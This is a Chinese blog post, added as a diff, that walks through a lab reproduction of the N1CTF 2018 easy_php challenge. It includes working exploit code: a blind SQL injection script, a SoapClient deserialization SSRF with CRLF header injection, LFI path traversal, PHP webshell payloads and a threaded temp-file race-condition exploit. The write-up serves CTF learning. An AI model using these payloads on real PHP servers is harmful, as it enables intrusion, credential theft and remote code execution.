@@ -1,0 +1,1328 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
+
+	<!DOCTYPE html>
+	<html class="scrollbar">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      2018n1ctf-esay-php复现 | 似雍&amp;&amp;非庸
+    
+  </title>
+  <meta name="author" content="Alex">
+  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="description" content="个人博客" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  <link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  
+
+    <!-- jquery -->
+	<script src="/js/jquery-2.1.1.min.js"></script>
+
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/images/post-cover/">
+	<div class="mask">
+		<div class="h-header">
+			<div id="logo-S">
+				
+					<a href="/">
+						<img src="/img/logo.png" alt="Logo">
+					</a>
+				
+			</div>
+			<!-- Navigation in header(id="navigation-S") -->
+			<div id="navigation-S">
+				<ul>
+					
+						<li class="menu-home">
+							<a href="/" class="menu-item-home">主页</a>
+						</li>
+					
+						<li class="menu-archive">
+							<a href="/archives" class="menu-item-archive">归档</a>
+						</li>
+					
+						<li class="menu-categories">
+							<a href="/categories" class="menu-item-categories">分类</a>
+						</li>
+					
+						<li class="menu-tags">
+							<a href="/tags" class="menu-item-tags">标签</a>
+						</li>
+					
+						<li class="menu-about">
+							<a href="/about" class="menu-item-about">关于</a>
+						</li>
+					
+						<li class="menu-gallery">
+							<a href="/gallery" class="menu-item-gallery">相册</a>
+						</li>
+					
+
+					
+						<li class="menu-search">
+							<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+						</li>
+					
+				</ul>			
+			</div>				
+		</div>
+
+		<div class="h-body">	
+			<!-- motto -->
+			
+				<div id="page-motto">
+					<p class="motto">
+						
+					</p>
+				</div>
+			
+
+			<div id="navigation-H">
+				<!-- Page title -->
+				<p>
+					
+						当前文章&nbsp;:&nbsp;《2018n1ctf-esay-php复现》
+					
+				</p>
+				<!-- Progress bar -->
+				<div id="progress-bar"></div>
+
+				<!-- Progress percent -->
+				<div id="progress-percentage">
+					<h1>0.0%</h1>
+				</div>
+			</div>
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<ul>
+				<li>
+					<a><i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>切换背景</a>
+				</li>
+				<li>
+					<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down"></i>继续阅读</a>
+				</li>
+				<li>
+					<a href="https://github.com/Sariay/hexo-theme-Annie" target="_blank"><i class="fa fa-download"></i>克隆主题</a>
+				</li>
+			</ul>
+		</div>
+		
+		<!-- This is only a demo, please go to "https://time.is" to set your city time! -->
+<style type="text/css">
+	.header-date {
+		position: absolute;
+		left: 40px;
+		bottom: 30px;
+		writing-mode: tb-rl;
+		font-size: 36px;
+	}	
+	.header-date a {
+		border-bottom: none;
+	}
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			position: absolute;
+			left: 40px;
+			bottom: 30px;
+			writing-mode: tb-rl;
+			font-size: 20px;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow" ></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+</header>
+
+<!-- Navigation in div(id="navigation-H") -->
+<a class="nav-trigger">
+	<span></span>
+</a>
+
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+			
+				<li class="menu-home">
+					<a href="/" class="menu-item-home">主页</a>
+				</li>
+			
+				<li class="menu-archive">
+					<a href="/archives" class="menu-item-archive">归档</a>
+				</li>
+			
+				<li class="menu-categories">
+					<a href="/categories" class="menu-item-categories">分类</a>
+				</li>
+			
+				<li class="menu-tags">
+					<a href="/tags" class="menu-item-tags">标签</a>
+				</li>
+			
+				<li class="menu-about">
+					<a href="/about" class="menu-item-about">关于</a>
+				</li>
+			
+				<li class="menu-gallery">
+					<a href="/gallery" class="menu-item-gallery">相册</a>
+				</li>
+			
+
+			
+				<li class="menu-search">
+					<a href="javascript:;" class="popup-trigger" title="Search">搜索</a>
+				</li>
+			
+		</ul>
+	</div>
+
+	<div class="nav-footer">
+		<ul>
+	
+		
+			<li>
+				<a href="http://github.com/" title="Github" target="_blank">
+					<i class="fa fa-github"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Weibo" target="_blank">
+					<i class="fa fa-weibo"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="mailto:http://github.com/" title="Email" target="_blank">
+					<i class="fa fa-envelope-o"></i>
+				</a>
+			</li>
+		
+
+		
+			<li>
+				<a href="http://github.com/" title="QQ" target="_blank">
+					<i class="fa fa-qq"></i>
+				</a>
+			</li>
+		
+		
+			<li>
+				<a href="http://github.com/" title="Twitter" target="_blank">
+					<i class="fa fa-twitter"></i>
+				</a>
+			</li>
+		
+	 
+</ul>
+	</div>
+</nav>
+
+		
+		<!--main-->
+		<main>
+			<div class="layout-post">
+	
+	
+	<div class="article-title">
+		
+	<a href="/2019/08/06/2018n1ctf-esay-php复现/" itemprop="url">
+		2018n1ctf-esay-php复现
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			
+	发布于
+	<a href="/2019/08/06/2018n1ctf-esay-php复现/" itemprop="url">
+		<time datetime="2019-08-06T08:49:08.000Z" itemprop="datePublished">
+	  		2019-08-06
+	  </time>
+	</a> 
+
+	/
+	更新于
+	<a href="/2019/08/06/2018n1ctf-esay-php复现/" itemprop="url">
+		<time datetime="2019-08-06T08:49:08.000Z" itemprop="dateUpdated">
+	  		2019-08-20
+	  </time>
+	</a> 	
+
+		</span>
+		/
+		<span>
+			<i class="fa fa-tags"></i>
+			
+	
+		<a href="/tags/writeup/" class=" ">
+			writeup
+		</a>
+	
+		
+		</span>
+		/
+		
+
+    <span class="leancloud_visitors" id="/2019/08/06/2018n1ctf-esay-php复现/_visitors" data-url="/2019/08/06/2018n1ctf-esay-php复现/" data-title="2018n1ctf-esay-php复现">
+        热度
+        <i class="leancloud_visitors_count" id="leancloud_visitors_count">0</i>
+    </span>
+    
+    /
+
+
+
+    <span class="leancloud_likes" id="/2019/08/06/2018n1ctf-esay-php复现/_likes" data-url="/2019/08/06/2018n1ctf-esay-php复现/" data-title="2018n1ctf-esay-php复现" rel="unlike">
+        喜欢
+        <i class="fa fa-heart"></i>
+        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
+    </span>
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>官方给了环境，有dockerfile。所以比较容易搭建的。<a href="https://github.com/Nu1LCTF/n1ctf-2018" target="_blank" rel="noopener">官方文件</a>在docker上安装上docker-compose（linux上需要安装），在相应目录下，运行docker-compose build，docker-compose up即可。<br>可以关闭后用docker-compose start开启。</p>
+<h2 id="官方预期解法"><a href="#官方预期解法" class="headerlink" title="官方预期解法"></a>官方预期解法</h2><p>通过扫描发现存在源码：<br>index.php~</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+
+require_once 'user.php';
+$C = new Customer();
+if(isset($_GET['action']))
+require_once 'views/'.$_GET['action'];
+else
+header('Location: index.php?action=login');
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>尝试user.php~发现也存在源码。（源码太多，就不粘了）<br>在user.php~发现了config.php同样存在config.php~<br>发现存在views目录发现，尝试访问发现一堆源码：<br><img src="https://s2.ax1x.com/2019/08/07/e5Dwng.png" alt="e5Dwng.png"><br>审计源码：<br>发现存在sql注入。<br>主要代码：</p>
+<pre class="line-numbers language-html"><code class="language-html">function publish()
+    {
+        if(!$this->check_login()) return false;
+        if($this->is_admin == 0)
+        {
+            if(isset($_POST['signature']) &amp;&amp; isset($_POST['mood'])) {
+
+                $mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));
+                $db = new Db();
+                @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
+                if($ret)
+                    return true;
+                else
+                    return false;
+            }
+        }
+        else
+        {
+                if(isset($_FILES['pic'])) {
+                    if (upload($_FILES['pic'])){
+                        echo 'upload ok!';
+                        return true;
+                    }
+                    else {
+                        echo "upload file error";
+                        return false;
+                    }
+                }
+                else
+                    return false;
+
+
+        }
+
+    }
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里我们发现这里对所有参数的单引号，双引号，NULL 字符，反斜线进行转义（addsla_all()），然而我们发现在get_column函数中对参数进行的是反引号进行包裹，所以并不影响我们注入，这里强制将mood参数转换成整型，所以只能在signature参数上注入。</p>
+<p>注册并登录后<br>脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">import requests
+import string
+import urllib
+url = "http://192.168.190.140/index.php?action=publish"
+flag = ""
+cookie={
+    "PHPSESSID":"256d0bbef5d2be1e63186dd96c64a7f9"
+}
+
+for i in range(1,33):
+    for j in "0123456789."+string.letters+"!@#$^&amp;*(){}=+`~_":
+        s='1`,if(ascii(substr((select username from ctf_users where is_admin=1),'+str(i)+',1))='+str(ord(j))+',sleep(3),0))#'
+        # s='1`,if(ascii(substr((select password from ctf_users where is_admin=1),'+str(i)+',1))='+str(ord(j))+',sleep(3),0))#'
+        # s='1`,if(ascii(substr((select password from ctf_users where username=0x61646d696e),'+str(i)+',1))='+str(ord(j))+',sleep(3),0))#'
+        data = {
+            "signature":s,
+            "mood":"1"
+           }
+        try:
+            r =requests.post(url=url,data=data,cookies=cookie,timeout=2.5)
+            # print i
+        except:
+            flag+=j
+            print flag
+            break
+#username admin
+#password  2533f492a796a3227b0c6f91d102cc36 nu1ladmin
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>尝试登陆，发现登陆不成。想到了admin关闭了这个选项 <code>allow_diff_ip</code>，既不能异地登录。<br>获取管理员登陆的ip。通过上面的注入。得到ip为<code>127.0.0.1</code>。<br>获取ip的函数 <code>getip()</code>。</p>
+<pre class="line-numbers language-html"><code class="language-html">function get_ip(){
+    return $_SERVER['REMOTE_ADDR'];
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>看上去是让你绕过 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 伪造ip。（菜鸡在这表示jj）<br>再来审计源码，我们发现存在反序列化漏洞。：<br>在 <code>user.php</code> 函数 <code>showmess()</code>里：<br><img src="https://s2.ax1x.com/2019/08/07/e5okH1.png" alt="e5okH1.png"><br>因为，通过sql注入，我们可以控制mood参数。</p>
+<pre><code>1`, {serialize object})#
+</code></pre><p>把反序列化对象存在数据库中。然后显示新闻的时候，就会会实例化对象。即访问<code>index.php?action=index</code> 的时候触发。<br>但是我们该利用哪个类呢？（菜鸡哭晕）<br>想起phpinfo了。<br><img src="https://s2.ax1x.com/2019/08/07/e5bxl8.png" alt="e5bxl8.png"><br>发现soap拓展开着啊。soap有<code>SoapClient</code>类。<br>这个类是用来创建soap数据报文，与wsdl接口进行交互的。<br>这个类的基本用法：<br><img src="https://s2.ax1x.com/2019/08/07/e5L226.png" alt="e5L226.png"><br>通过传入两个参数，第一个是 <code>$url</code>, 即目标url, 第二个参数是一个数组，里面是soap请求的一些参数和属性。<br>第二个参数的相关介绍：<br><img src="https://s2.ax1x.com/2019/08/07/e5X9mD.png" alt="e5X9mD.png"><br>我们可以看到这个类传入的第一个参数为 <code>$wsdl</code><br><img src="https://s2.ax1x.com/2019/08/07/e5jSCn.png" alt="e5jSCn.png"><br>控制是否是<code>wsdl</code>模式，如果为<code>NULL</code>，就是<code>非wsdl</code>模式.<br>如果是<code>非wsdl</code>模式，反序列化的时候就会对<code>options</code>中的<code>url</code>进行远程soap请求，<br>如果是wsdl模式，在<code>序列化之前</code>就会对$url参数进行请求，从而无法可控序列化数据。<br>我们可以尝试一下，看看是否能发送soap请求。</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$a = new SoapClient(null, array('location' => "http://192.168.190.128:9000",'uri'=> "aaa"));
+echo serialize($a);
+//运行一下得到
+//O:10:"SoapClient":3:{s:3:"uri";s:3:"aaa";s:8:"location";s:27:"http://192.168.190.128:9000";s:13:"_soap_version";i:1;}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里的ip为我们的vps。<br>这时我们要把数据存入数据库。<br><img src="https://s2.ax1x.com/2019/08/07/eISsO0.png" alt="eISsO0.png"><br>然后，我们开启对我们vps的监听,在vps上运行<code>nc -lvv 9000</code>。<br>然后我们来让服务器发送请求，即访问<code>index.php?action=index</code><br>查看我们的监听。成功监听到soap请求。</p>
+<p><img src="https://s2.ax1x.com/2019/08/07/eIp3h4.png" alt="eIp3h4.png"></p>
+<p>现在我们已经触发了SSRF，但可以看到<code>SOAP</code>原始的数据是不符合<code>POST</code>请求的数据格式的，所以，我们要想办法控制<code>soap</code>请求使它符合<code>post</code>请求，从而实现我们的目的。</p>
+<p>你可以看到我成功获得了soap请求, 我们可以发现我们可控的地方是 <code>uri</code>。<br>所以我们可以伪造一个请求。在header里 <code>User-Agent</code> 在 <code>Content-Type</code> 前面, 我们我们可以很轻松的控制整个<code>POST</code>报文。<br>wupco师傅写的简单poc：</p>
+<pre class="line-numbers language-html"><code class="language-html">&lt;?php
+$target = 'http://192.168.190.128:9000';
+$post_string = 'a=b&amp;flag=aaa';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: xxxx=1234'
+    );
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'alex^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
+
+$aaa = serialize($b);
+$aaa = str_replace('^^','%0d%0a',$aaa);
+$aaa = str_replace('&amp;','%26',$aaa);
+echo $aaa;
+//O:10:"SoapClient":4:{s:3:"uri";s:4:"aaab";s:8:"location";s:27:"http://192.168.190.128:9000";s:11:"_user_agent";s:137:"wupco%0d%0aContent-Type: application/x-www-form-urlencoded%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aCookie: xxxx=1234%0d%0aContent-Length: 12%0d%0a%0d%0aa=b%26flag=aaa";s:13:"_soap_version";i:1;}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发送数据到数据库，然后访问<code>index.php?action=index</code>,我们成功打到请求内容。<br><img src="https://s2.ax1x.com/2019/08/07/eIYMbq.png" alt="eIYMbq.png"><br>这里是<code>soap</code>请求的<code>content/type</code>是text/xml; charset=utf‐8，我们没办法直接覆盖掉原本的content/type，而我们知道，要能通过$_POST获取数据，content/type要是<code>application/x‐www‐form‐urlencoded</code>才行。然后我们从SOAP的参数说明中知道：soap中是支持<code>User-Agent</code>的，并且在header里 User-Agent 是在 Content-Type 前面的，所以我们可以通过控制<code>User-Agent</code>来控制整个POST报文。</p>
+<p>现在我们来构造我们的请求。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+$target = 'http://127.0.0.1/index.php?action=login';
+$post_string = 'username=admin&amp;password=nu1ladmin&amp;code=63732';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: PHPSESSID=j2qdvjf36op9ge50lsjo3bske5'
+    );
+$b = new SoapClient(null,array('location' => $target,'user_agent'=>'alex^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'      => "aaab"));
+
+$aaa = serialize($b);
+$aaa = str_replace('^^',"\r\n",$aaa);
+$aaa = str_replace('&amp;','&amp;',$aaa);
+echo bin2hex($aaa);
+?></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这里的要控制cookie和code，这里的session和code是我们用新的浏览器访问题目，得到的新的cookie和code。用来伪造管理员本地登陆。</p>
+<p><img src="https://s2.ax1x.com/2019/08/07/eIt1OA.png" alt="eIt1OA.png"></p>
+<p>我们用我们的账号发送数据到数据库。<br><img src="https://s2.ax1x.com/2019/08/07/eItckV.png" alt="eItckV.png"></p>
+<p>然后访问<code>index.php?action=index</code>。这时我们就成功伪造了管理员本地登陆请求。然后刷新新浏览器的页面，就登陆成功了。<br><img src="https://s2.ax1x.com/2019/08/07/eINsjH.png" alt="eINsjH.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/07/eINREt.png" alt="eINREt.png"></p>
+<p>这时我们可以再审审upload函数：</p>
+<pre class="line-numbers language-html"><code class="language-html">function upload($file){
+    $file_size  = $file['size'];
+    if($file_size>2*1024*1024) {
+        echo "pic is too big!";
+        return false;
+    }
+    $file_type = $file['type'];
+    if($file_type!="image/jpeg" &amp;&amp; $file_type!='image/pjpeg') {
+        echo "file type invalid";
+        return false;
+    }
+    if(is_uploaded_file($file['tmp_name'])) {
+        $uploaded_file = $file['tmp_name'];
+        $user_path =  "/app/adminpic";
+        if (!file_exists($user_path)) {
+            mkdir($user_path);
+        }
+        $file_true_name = str_replace('.','',pathinfo($file['name'])['filename']);
+        $file_true_name = str_replace('/','',$file_true_name);
+        $file_true_name = str_replace('\\','',$file_true_name);
+        $file_true_name = $file_true_name.time().rand(1,100).'.jpg';
+        $move_to_file = $user_path."/".$file_true_name;
+        if(move_uploaded_file($uploaded_file,$move_to_file)) {
+            if(stripos(file_get_contents($move_to_file),'<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php')</span><span class="token punctuation">></span></span>=0)
+                system('sh /home/nu1lctf/clean_danger.sh');
+            return $file_true_name;
+        }
+        else
+            return false;
+    }
+    else
+        return false;
+}
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>如果你上传的文件包含 <code>&lt;?php</code>,就会运行一个bash <code>clean_danger.sh</code>。<br>用LFI读取clean_danger.sh。<br><code>http://192.168.190.140/index.php?action=../../../../../home/nu1lctf/clean_danger.sh</code><br>得到：</p>
+<pre class="line-numbers language-html"><code class="language-html">cd /app/adminpic/
+rm *.jpg
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>如何绕过它呢？<br>最简单的是，传入一个js样式的shell。<br><img src="https://s2.ax1x.com/2019/08/07/eIas0A.png" alt="eIas0A.png"><br>这样就有了shell。但是发了个比较gay的问题。emmm<br>没有文件名，上传之后爆破文件名。<br>这里给了命名的方式。<br><img src="https://s2.ax1x.com/2019/08/07/eIdWU1.png" alt="eIdWU1.png"><br>上传之前先获得一下时间戳。</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token prolog">&lt;?php
+date_default_timezone_set("PRC");
+$time = time();
+echo $time;
+?></span>//1565173525
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>爆破脚本:</p>
+<pre class="line-numbers language-html"><code class="language-html">#coding=utf-8
+import requests
+time = 156517352500 #这里比时间戳多了两位。因为rand函数。
+url = 'http://192.168.190.140/index.php?action=../../../../app/adminpic/jsshell{}.jpg'
+for i in range(10000):
+    tmp = time + i
+    ul = url.format(tmp)
+    html = requests.get(ul).status_code
+    if html == 200:
+        print(ul)
+        break
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到路径：<br><img src="https://s2.ax1x.com/2019/08/07/eIrInU.png" alt="eIrInU.png"><br>即为shell，菜刀连接发现并没有flag，猜测在数据库中。<br>但是很坑的是，蚁剑连不上。只能上菜刀了。<br><code>http://192.168.190.140/index.php?action=../../../../run.sh</code><br><img src="https://s2.ax1x.com/2019/08/07/eIREgs.png" alt="eIREgs.png"><br>在<code>/run.sh</code>中找到数据库的账号密码。<br>里面的反斜线是转义符，菜刀连的时候要去掉。<br>即可得到flag。<br><img src="https://s2.ax1x.com/2019/08/07/eIRviF.png" alt="eIRviF.png"></p>
+<p>另一种绕过方式。<br>使用linux命令的一个feature<br>当我们创建诸如 <code>-xa.jpg</code>的文件后。<br>我们不能通过 <code>rm *</code> or <code>rm *.jpg</code> 删除它<br>除非 <code>rm -r adminpic/</code><br>另外一种是使用短标签。<br>你可以发现 <code>short_open_tag = Off</code> 在 phpinfo<br>因为php版本高于5.4 你依然可以使用 <code>&lt;?=</code> 拿到webshell<br><img src="https://s2.ax1x.com/2019/08/07/eIfEmq.png" alt="eIfEmq.png"></p>
+<h2 id="非预期解法一"><a href="#非预期解法一" class="headerlink" title="非预期解法一"></a>非预期解法一</h2><p>利用session.upload。</p>
+<p><code>session.upload_progress.enabled</code>这个参数在php.ini 默认开启，需要手动置为Off<br>如果不是Off，就会在上传的过程中生成上传进度文件。<br>看phpinfo可以看到<code>upload_progress.enabled</code>关闭（我这是从比赛后的docker布置的，所以可能跟比赛时环境不一样）我们进后台改成开启，并且给出了<code>session.save_path</code><br><img src="https://s2.ax1x.com/2019/08/07/eIhVvd.png" alt="eIhVvd.png"><br>修改后：<br><img src="https://s2.ax1x.com/2019/08/20/mGzDx0.png" alt="mGzDx0.png"></p>
+<pre class="line-numbers language-html"><code class="language-html">/var/lib/php5/sess_{your_php_session_id}
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>我们去包含一下试试<br><code>http://192.168.190.140/index.php?action=../../../../var/lib/php5/sess_qqefair09hbdsolv24b41uo4l6</code><br><img src="https://s2.ax1x.com/2019/08/07/eIh1PS.png" alt="eIh1PS.png"><br>我们直接用官方给出的表单加以修改就可使用,我构造的payload：</p>
+<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.190.143/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+ &lt;input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="<span class="token prolog">&lt;?=`echo '&lt;?php eval(\$_REQUEST[alex])?></span>'>alex.php`?>" />
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file1<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file2<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是需要注意的是，cleanup是on，所以这里用了条件竞争，一遍疯狂发包，一遍疯狂请求。两个包：<br><img src="https://s2.ax1x.com/2019/08/20/mJSpsf.png" alt="mJSpsf.png"></p>
+<p><img src="https://s2.ax1x.com/2019/08/20/mJSuLT.png" alt="mJSuLT.png"></p>
+<p>得到：<br><img src="https://s2.ax1x.com/2019/08/20/mJpP6x.png" alt="mJpP6x.png"><br>说明我们竞争成功了，最后可以在/app/下找到写入的shell:<br><img src="https://s2.ax1x.com/2019/08/20/mJ9hGj.png" alt="mJ9hGj.png"><br>接下来就是找数据库密码，连接数据库获取密码了。</p>
+<h2 id="非预期解法二"><a href="#非预期解法二" class="headerlink" title="非预期解法二"></a>非预期解法二</h2><p>/tmp/临时文件竞争</p>
+<p>通过<code>racing condition</code>来在临时文件被删除之前包含它。 这个想法的依据是<code>FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5</code> ，这个镜像我们pull下来发现其中默认目录<code>/var/www/phpinfo/index.php</code>有个phpinfo存在，然后就能利用lfi包含临时文件getshell了<br>因为phpinfo直接给出了临时文件的文件名与绝对路径<br>读取run.sh发现：<br><img src="https://s2.ax1x.com/2019/08/20/mJQjHg.png" alt="mJQjHg.png"></p>
+<p>利用python不断伪造上传包，再根据phpinfo()返回的路径名去包含文件<br>一旦条件竞争成功，包含该文件即会触发写文件<br>在/app/目录下的intrd文件里写进我们的shell<br>然后即可达成getshell的目的</p>
+<p>国外大哥的exp脚本：</p>
+<pre class="line-numbers language-html"><code class="language-html">## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit 
+# Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team
+# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/
+
+## passwords.txt payload content
+# <span class="token prolog">&lt;?php $c=fopen('/app/intrd','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?></span>');?>
+
+import sys,Queue,threading,hashlib,os, requests,  pickle, os.path, re
+from subprocess import Popen, PIPE, STDOUT
+
+NumOfThreads=50
+queue = Queue.Queue()
+
+class checkHash(threading.Thread):
+    def __init__(self,queue):
+        threading.Thread.__init__(self)
+        self.queue=queue
+    def run(self):
+        i=0
+        while True:
+            self.clear=self.queue.get()
+            passtry = self.clear
+            if passtry != "":
+
+                padding="A" * 5000
+
+                cookies = {
+                    'PHPSESSID': '58dnkc9litj4ipv18837cutgg6',
+                    'othercookie': padding
+                }
+
+                headers = {
+                    'User-Agent': padding,
+                    'Pragma': padding,
+                    'Accept': padding,
+                    'Accept-Language': padding,
+                    'DNT': '1'
+                }
+
+                files = {'arquivo': open('passwords.txt','rb')}
+
+                reqs='http://192.168.190.143/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding
+                #reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding
+                response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False)
+                data = response.content
+                data = re.search(r"(?&lt;=tmp_name] =<span class="token entity" title="&gt;">&amp;gt;</span> ).*", data).group(0)
+                print data
+
+                reqs = 'http://192.168.190.143/index.php?action=../..'+data
+                #reqs = 'http://172.17.0.2:80/index.php?action=../..'+data
+                print reqs
+                response = requests.get(reqs, verify=False)
+                data = response.content
+                print data
+
+            i+=1
+            self.queue.task_done()
+
+for i in range(NumOfThreads):
+    t=checkHash(queue)
+    t.setDaemon(True)
+    t.start()
+
+for x in range(0, 9999):
+    x=str(x)
+    queue.put(x.strip())
+
